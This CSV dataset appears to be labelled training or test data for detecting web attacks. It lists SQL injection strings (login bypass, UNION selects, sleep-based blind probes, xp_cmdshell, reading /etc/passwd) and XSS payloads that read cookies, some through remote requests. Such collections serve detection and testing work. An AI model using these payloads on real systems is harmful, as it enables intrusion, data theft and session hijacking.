index,input,category,labels
70,""" or ""x""=""x
",sql,1
71,""") or (""x"")=(""x
",sql,1
72,""")) or ((""x""))=((""x
",sql,1
73,"or 1=1
",sql,1
74,"or 1=1-- 
",sql,1
75,"or 1=1#
",sql,1
76,"or 1=1/*
",sql,1
77,"admin' --
",sql,1
78,"admin' #
",sql,1
79,"admin'/*
",sql,1
80,"admin' or '1'='1
",sql,1
81,"admin' or '1'='1'--
",sql,1
82,"admin' or '1'='1'#
",sql,1
83,"admin' or '1'='1'/*
",sql,1
84,"admin'or 1=1 or ''='
",sql,1
85,"admin' or 1=1
",sql,1
86,"admin' or 1=1--
",sql,1
87,"admin' or 1=1#
",sql,1
88,"admin' or 1=1/*
",sql,1
89,"admin') or ('1'='1
",sql,1
90,"admin') or ('1'='1'--
",sql,1
91,"admin') or ('1'='1'#
",sql,1
92,"admin') or ('1'='1'/*
",sql,1
93,"admin') or '1'='1
",sql,1
94,"admin') or '1'='1'--
",sql,1
95,"admin') or '1'='1'#
",sql,1
96,"admin') or '1'='1'/*
",sql,1
97,"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
",sql,1
98,"admin"" --
",sql,1
99,"admin"" #
",sql,1
100,"admin""/*
",sql,1
101,"admin"" or ""1""=""1
",sql,1
102,"admin"" or ""1""=""1""--
",sql,1
103,"admin"" or ""1""=""1""#
",sql,1
104,"admin"" or ""1""=""1""/*
",sql,1
105,"admin""or 1=1 or """"=""
",sql,1
106,"admin"" or 1=1
",sql,1
107,"admin"" or 1=1--
",sql,1
108,"admin"" or 1=1#
",sql,1
109,"admin"" or 1=1/*
",sql,1
110,"admin"") or (""1""=""1
",sql,1
111,"admin"") or (""1""=""1""--
",sql,1
112,"admin"") or (""1""=""1""#
",sql,1
113,"admin"") or (""1""=""1""/*
",sql,1
114,"admin"") or ""1""=""1
",sql,1
115,"admin"") or ""1""=""1""--
",sql,1
116,"admin"") or ""1""=""1""#
",sql,1
117,"admin"") or ""1""=""1""/*
",sql,1
118,"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055
",sql,1
119,")%20or%20('x'='x
",sql,1
120,"%20or%201=1
",sql,1
121,"; execute immediate 'sel' || 'ect us' || 'er'
",sql,1
122,"benchmark(10000000,MD5(1))#
",sql,1
123,"update
",sql,1
124,""";waitfor delay '0:0:__TIME__'--
",sql,1
125,"1) or pg_sleep(__TIME__)--
",sql,1
126,"||(elt(-3+5,bin(15),ord(10),hex(char(45))))
",sql,1
127,"""hi"""") or (""""a""""=""""a""
",sql,1
128,"delete
",sql,1
129,"like
",sql,1
130,""" or sleep(__TIME__)#
",sql,1
131,"pg_sleep(__TIME__)--
",sql,1
132,"*(|(objectclass=*))
",sql,1
133,"declare @q nvarchar (200) 0x730065006c00650063 ...
",sql,1
134," or 0=0 #
",sql,1
135,"insert
",sql,1
136,"1) or sleep(__TIME__)#
",sql,1
137,") or ('a'='a
",sql,1
138,"; exec xp_regread
",sql,1
139,"*|
",sql,1
140,"@var select @var as var into temp end --
",sql,1
141,"1)) or benchmark(10000000,MD5(1))#
",sql,1
142,"asc
",sql,1
143,"(||6)
",sql,1
144,"""a"""" or 3=3--""
",sql,1
145,""" or benchmark(10000000,MD5(1))#
",sql,1
146,"# from wapiti
",sql,1
147," or 0=0 --
",sql,1
148,"1 waitfor delay '0:0:10'--
",sql,1
149," or 'a'='a
",sql,1
150,"hi or 1=1 --""
",sql,1
151,"or a = a
",sql,1
152," UNION ALL SELECT
",sql,1
153,") or sleep(__TIME__)='
",sql,1
154,")) or benchmark(10000000,MD5(1))#
",sql,1
155,"hi' or 'a'='a
",sql,1
156,"0
",sql,1
157,"21 %
",sql,1
158,"limit
",sql,1
159," or 1=1
",sql,1
160," or 2 > 1
",sql,1
161,""")) or benchmark(10000000,MD5(1))#
",sql,1
162,"PRINT
",sql,1
163,"hi') or ('a'='a
",sql,1
164," or 3=3
",sql,1
165,"));waitfor delay '0:0:__TIME__'--
",sql,1
166,"a' waitfor delay '0:0:10'--
",sql,1
167,"1;(load_file(char(47,101,116,99,47,112,97,115, ...
",sql,1
168,"or%201=1
",sql,1
169,"1 or sleep(__TIME__)#
",sql,1
170,"or 1=1
",sql,1
171," and 1 in (select var from temp)--
",sql,1
172," or '7659'='7659
",sql,1
173," or 'text' = n'text'
",sql,1
174," --
",sql,1
175," or 1=1 or ''='
",sql,1
176,"declare @s varchar (200) select @s = 0x73656c6 ...
",sql,1
177,"exec xp
",sql,1
178,"; exec master..xp_cmdshell 'ping 172.10.1.255'--
",sql,1
179,"3.10E+17
",sql,1
180,""" or pg_sleep(__TIME__)--
",sql,1
181,"x' AND email IS NULL; --
",sql,1
182,"&
",sql,1
183,"admin' or '
",sql,1
184," or 'unusual' = 'unusual'
",sql,1
185,"//
",sql,1
186,"truncate
",sql,1
187,"1) or benchmark(10000000,MD5(1))#
",sql,1
188,"\x27UNION SELECT
",sql,1
189,"declare @s varchar(200) select @s = 0x77616974 ...
",sql,1
190,"tz_offset
",sql,1
191,"sqlvuln
",sql,1
192,"""));waitfor delay '0:0:__TIME__'--
",sql,1
193,"||6
",sql,1
194,"or%201=1 --
",sql,1
195,"%2A%28%7C%28objectclass%3D%2A%29%29
",sql,1
196,"or a=a
",sql,1
197,") union select * from information_schema.tables;
",sql,1
198,"PRINT @@variable
",sql,1
199,"or isNULL(1/0) /*
",sql,1
200,"26 %
",sql,1
201,""" or ""a""=""a
",sql,1
202,"(sqlvuln)
",sql,1
203,"x' AND members.email IS NULL; --
",sql,1
204," or 1=1--
",sql,1
205," and 1=( if((load_file(char(110,46,101,120,11 ...
",sql,1
206,"0x770061006900740066006F0072002000640065006C00 ...
",sql,1
207,"%20'sleep%2050'
",sql,1
208,"as
",sql,1
209,"1)) or pg_sleep(__TIME__)--
",sql,1
210,"/**/or/**/1/**/=/**/1
",sql,1
211," union all select @@version--
",sql,1
212,",@variable
",sql,1
213,"(sqlattempt2)
",sql,1
214," or (EXISTS)
",sql,1
215,"t'exec master..xp_cmdshell 'nslookup www.googl ...
",sql,1
216,"%20$(sleep%2050)
",sql,1
217,"1 or benchmark(10000000,MD5(1))#
",sql,1
218,"%20or%20''='
",sql,1
219,"||UTL_HTTP.REQUEST
",sql,1
220," or pg_sleep(__TIME__)--
",sql,1
221,"hi' or 'x'='x';
",sql,1
222,""") or sleep(__TIME__)=""
",sql,1
223," or 'whatever' in ('whatever')
",sql,1
224,"; begin declare @var varchar(8000) set @var=' ...
",sql,1
225," union select 1,load_file('/etc/passwd'),1,1,1;
",sql,1
226,"0x77616974666F722064656C61792027303A303A313027 ...
",sql,1
227,"exec(@s)
",sql,1
228,") or pg_sleep(__TIME__)--
",sql,1
229," union select
",sql,1
230," or sleep(__TIME__)#
",sql,1
231," select * from information_schema.tables--
",sql,1
232,"a' or 1=1--
",sql,1
233,"a' or 'a' = 'a
",sql,1
234,"declare @s varchar(22) select @s =
",sql,1
235," or 2 between 1 and 3
",sql,1
236," or a=a--
",sql,1
237," or '1'='1
",sql,1
238,"|
",sql,1
239," or sleep(__TIME__)='
",sql,1
240," or 1 --'
",sql,1
241,"or 0=0 #""
",sql,1
242,"having
",sql,1
243,"a'
",sql,1
244,""" or isNULL(1/0) /*
",sql,1
245,"declare @s varchar (8000) select @s = 0x73656c ...
",sql,1
246,"â or 1=1 --
",sql,1
247,"char%4039%41%2b%40SELECT
",sql,1
248,"order by
",sql,1
249,"bfilename
",sql,1
250," having 1=1--
",sql,1
251,") or benchmark(10000000,MD5(1))#
",sql,1
252," or username like char(37);
",sql,1
253,";waitfor delay '0:0:__TIME__'--
",sql,1
254,""" or 1=1--
",sql,1
255,"x' AND userid IS NULL; --
",sql,1
256,"*/*
",sql,1
257," or 'text' > 't'
",sql,1
258," (select top 1
",sql,1
259," or benchmark(10000000,MD5(1))#
",sql,1
260,""");waitfor delay '0:0:__TIME__'--
",sql,1
261,"a' or 3=3--
",sql,1
262," -- &password=
",sql,1
263," group by userid having 1=1--
",sql,1
264," or ''='
",sql,1
265,"; exec master..xp_cmdshell
",sql,1
266,"%20or%20x=x
",sql,1
267,"select
",sql,1
268,""")) or sleep(__TIME__)=""
",sql,1
269,"0x730065006c0065006300740020004000400076006500 ...
",sql,1
270,"hi' or 1=1 --
",sql,1
271,""") or pg_sleep(__TIME__)--
",sql,1
272,"%20or%20'x'='x
",sql,1
273," or 'something' = 'some'+'thing'
",sql,1
274,"exec sp
",sql,1
275,"29 %
",sql,1
276,"(
",sql,1
277,"Ã½ or 1=1 --
",sql,1
278,"1 or pg_sleep(__TIME__)--
",sql,1
279,"0 or 1=1
",sql,1
280,") or (a=a
",sql,1
281,"uni/**/on sel/**/ect
",sql,1
282,"replace
",sql,1
283,"%27%20or%201=1
",sql,1
284,")) or pg_sleep(__TIME__)--
",sql,1
285,"%7C
",sql,1
286,"x' AND 1=(SELECT COUNT(*) FROM tabname); --
",sql,1
287,"&apos;%20OR
",sql,1
288,"; or '1'='1'
",sql,1
289,"declare @q nvarchar (200) select @q = 0x770061 ...
",sql,1
290,"1 or 1=1
",sql,1
291,"; exec ('sel' + 'ect us' + 'er')
",sql,1
292,"23 OR 1=1
",sql,1
293,"/
",sql,1
294,"anything' OR 'x'='x
",sql,1
295,"declare @q nvarchar (4000) select @q =
",sql,1
296,"or 0=0 --
",sql,1
297,"desc
",sql,1
298,"||'6
",sql,1
299,")
",sql,1
300,"1)) or sleep(__TIME__)#
",sql,1
301,"or 0=0 #
",sql,1
302," select name from syscolumns where id = (sele ...
",sql,1
303,"hi or a=a
",sql,1
304,"*(|(mail=*))
",sql,1
305,"password:*/=1--
",sql,1
306,"distinct
",sql,1
307,");waitfor delay '0:0:__TIME__'--
",sql,1
308,"to_timestamp_tz
",sql,1
309,""") or benchmark(10000000,MD5(1))#
",sql,1
310," UNION SELECT
",sql,1
311,"%2A%28%7C%28mail%3D%2A%29%29
",sql,1
312,"+sqlvuln
",sql,1
313," or 1=1 /*
",sql,1
314,")) or sleep(__TIME__)='
",sql,1
315,"or 1=1 or """"=
",sql,1
316," or 1 in (select @@version)--
",sql,1
317,"sqlvuln;
",sql,1
318," union select * from users where login = char ...
",sql,1
319,"x' or 1=1 or 'x'='y
",sql,1
320,"28 %
",sql,1
321,"â or 3=3 --
",sql,1
322,"@variable
",sql,1
323," or '1'='1'--
",sql,1
324,"""a"""" or 1=1--""
",sql,1
325,"//*
",sql,1
326,"%2A%7C
",sql,1
327,""" or 0=0 --
",sql,1
328,""")) or pg_sleep(__TIME__)--
",sql,1
329,"?
",sql,1
330," or 1/*
",sql,1
331,"!
",sql,1
332,"'
",sql,1
333," or a = a
",sql,1
334,"declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
",sql,1
335,"declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)
",sql,1
336,"declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
",sql,1
337,"declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
",sql,1
338,"' or 1=1
",sql,1
339," or 1=1 --
",sql,1
340,"x' OR full_name LIKE '%Bob%
",sql,1
341,"'; exec master..xp_cmdshell 'ping 172.10.1.255'--
",sql,1
342,"'%20or%20''='
",sql,1
343,"'%20or%20'x'='x
",sql,1
344,"')%20or%20('x'='x
",sql,1
345,"' or 0=0 --
",sql,1
346,"' or 0=0 #
",sql,1
347," or 0=0 #""
",sql,1
348,"' or 1=1--
",sql,1
349,"' or '1'='1'--
",sql,1
350,"' or 1 --'
",sql,1
351,"or 1=1--
",sql,1
352,"' or 1=1 or ''='
",sql,1
353," or 1=1 or """"=
",sql,1
354,"' or a=a--
",sql,1
355," or a=a
",sql,1
356,"') or ('a'='a
",sql,1
357,"'hi' or 'x'='x';
",sql,1
358,"or
",sql,1
359,"procedure
",sql,1
360,"handler
",sql,1
361,"' or username like '%
",sql,1
362,"' or uname like '%
",sql,1
363,"' or userid like '%
",sql,1
364,"' or uid like '%
",sql,1
365,"' or user like '%
",sql,1
366,"'; exec master..xp_cmdshell
",sql,1
367,"'; exec xp_regread
",sql,1
368,"t'exec master..xp_cmdshell 'nslookup www.google.com'--
",sql,1
369,"--sp_password
",sql,1
370,"' UNION SELECT
",sql,1
371,"' UNION ALL SELECT
",sql,1
372,"' or (EXISTS)
",sql,1
373,"' (select top 1
",sql,1
374,"'||UTL_HTTP.REQUEST
",sql,1
375,"1;SELECT%20*
",sql,1
376,"<>""'%;)(&+
",sql,1
377,"'%20or%201=1
",sql,1
378,"'sqlattempt1
",sql,1
379,"%28
",sql,1
380,"%29
",sql,1
381,"%26
",sql,1
382,"%21
",sql,1
383,"' or ''='
",sql,1
384,"' or 3=3
",sql,1
385," or 3=3 --
",sql,1
386,"<script>onerror=alert;throw 1337</script>
",xss,1
387,"<script>{onerror=alert}throw 1337</script>
",xss,1
388,"<script>throw onerror=alert,'some string',123,'haha'</script>
",xss,1
389,"<script>{onerror=eval}throw'=alert\x281337\x29'</script>
",xss,1
390,"<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>
",xss,1
391,"<script>{onerror=prompt}throw{lineNumber:1,columnNumber:1,fileName:'second argument',message:'first argument'}</script>
",xss,1
392,"<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
",xss,1
393,"<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
",xss,1
394,"'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
",xss,1
395,"<<scr\0ipt/src=http://xss.com/xss.js></script
",xss,1
396,"%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E
",xss,1
397,"' onmouseover=alert(/XSS/)
",xss,1
398,"""><iframe%20src=""http://google.com""%%203E
",xss,1
399,"'<script>window.onload=function(){document.forms[0].message.value='1';}</script>
",xss,1
400,"x”</title><img src%3dx onerror%3dalert(1)>
",xss,1
401,"<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>
",xss,1
402,"<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>
",xss,1
403,"<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>
",xss,1
404,"<script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>
",xss,1
405,"<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
",xss,1
406,"<script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>
",xss,1
407,"<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>
",xss,1
408,"<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>
",xss,1
409,"<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>
",xss,1
410,"<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>
",xss,1
411,"<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());</script>
",xss,1
412,"<script>alert(document.head.innerHTML.substr(146,20));</script>
",xss,1
413,"<script>alert(document.head.childNodes[3].text)</script>
",xss,1
414,"<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>
",xss,1
415,"<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>
",xss,1
416,"<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%22)};document.body.appendChild(x);</script>
",xss,1
417,"<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\/script>%22)};document.body.appendChild(x);</script>
",xss,1
418,"<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>
",xss,1
419,"<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>
",xss,1
420,"<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>
",xss,1
421,"<script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>
",xss,1
422,"<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>
",xss,1
423,"<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script>
",xss,1
424,"<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #
",xss,1
425,"<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> #
",xss,1
426,"<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#
",xss,1
427,"<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#
",xss,1
428,"<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23
",xss,1
429,"<script for=document event=onreadystatechange>getElementById('safe123').click()</script>
",xss,1
430,"<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>
",xss,1
431,"<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>
",xss,1
432,"<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
",xss,1
433,"<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
",xss,1
434,"<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
",xss,1
435,"<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
",xss,1
436,"<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#
",xss,1
437,"<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
",xss,1
438,"<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
",xss,1
439,"<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>
",xss,1
